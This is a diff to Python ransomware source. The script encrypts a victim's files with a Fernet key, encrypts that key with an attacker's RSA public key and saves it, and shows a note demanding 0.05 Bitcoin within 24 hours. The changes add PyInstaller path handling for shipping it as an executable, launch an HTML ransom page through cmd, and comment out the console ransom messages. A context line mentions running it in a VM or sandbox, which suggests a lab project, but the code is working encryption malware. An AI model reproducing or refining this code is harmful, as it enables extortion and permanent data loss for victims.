@@ -3,7 +3,12 @@ from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.backends import default_backend 
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.fernet import Fernet
+from subprocess import Popen
 
+def get_filestr(filestring: str) -> str:
+    if getattr(sys, 'frozen', False):
+        filestring = os.path.join(sys._MEIPASS, filestring)
+    return filestring
 
 def encrypt(plaintext: bytes, key: Fernet) -> None:
     return key.encrypt(plaintext)
@@ -20,6 +25,8 @@ def encryption(key: bytes):
                 f.write(encrypt(plaintext, fernet))
 
 def save_key(keyfile: str, key: bytes, save_loc, filename = "keyfile"):
+    keyfile = get_filestr(keyfile)
+
     with open(keyfile, "rb") as f:
         public_key = serialization.load_pem_public_key(
             f.read(),
@@ -40,6 +47,9 @@ def save_key(keyfile: str, key: bytes, save_loc, filename = "keyfile"):
         os.mkdir(path)
     with open(os.path.join(path, filename), "wb") as f:
         f.write(encrypted_key)
+
+def open_webpage(webpage: str) -> None:
+    Popen(["cmd", "/C", "start", webpage, ";", "exit"])
 
 skull = '''
                      ______
@@ -63,13 +73,14 @@ VM or sandbox and set RUNNING_ON_VM environment variable")
 
 try: 
     encryption(Fernet.generate_key())
-    print(skull)
-    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
-    print("\n You Are Hacked \n")
-    print("\n Don't Kill The Process You Will Not be Able to Recover Data\n")
-    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
-    print("Pay 0.05 Bitcoin to address xxx in 24 hours else your files will be gone forever.\n")
-    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
+    open_webpage("gui.html")
+    # print(skull)
+    # print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
+    # print("\n You Are Hacked \n")
+    # print("\n Don't Kill The Process You Will Not be Able to Recover Data\n")
+    # print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
+    # print("Pay 0.05 Bitcoin to address xxx in 24 hours else your files will be gone forever.\n")
+    # print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
 
 except Exception as e:
     print("Encryption Failed")
